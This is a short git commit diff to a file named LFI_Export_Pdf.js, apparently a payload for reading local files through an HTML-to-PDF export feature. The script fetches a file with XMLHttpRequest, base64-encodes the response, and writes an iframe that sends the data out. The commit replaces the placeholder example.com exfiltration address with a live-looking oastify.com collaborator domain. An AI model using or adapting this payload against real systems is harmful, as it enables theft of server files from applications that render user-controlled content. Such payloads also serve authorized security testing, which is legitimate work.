bedba81dd0f890f8fe6f4d4d029aa151ec67949d
HakOLOUSA <156422757+HakOLOUSA@users.noreply.github.com>
2024-12-07 22:08:31 +0700

    Update LFI_Export_Pdf.js

--- LFI_Export_Pdf.js
+++ LFI_Export_Pdf.js
@@ -3,7 +3,7 @@ function reqListener () {
     var b64 = btoa(this.responseText);
     var raw = this.responseText;
     document.write('<iframe
-src="http://example.com/exfil?data='+b64+'"></iframe>');
+src="http://qoie2om8uzoxv0ll9lgekp1qphv8jy7n.oastify.com/exfil?data='+b64+'"></iframe>');
 }
 var oReq = new XMLHttpRequest();
 oReq.addEventListener("load", reqListener);
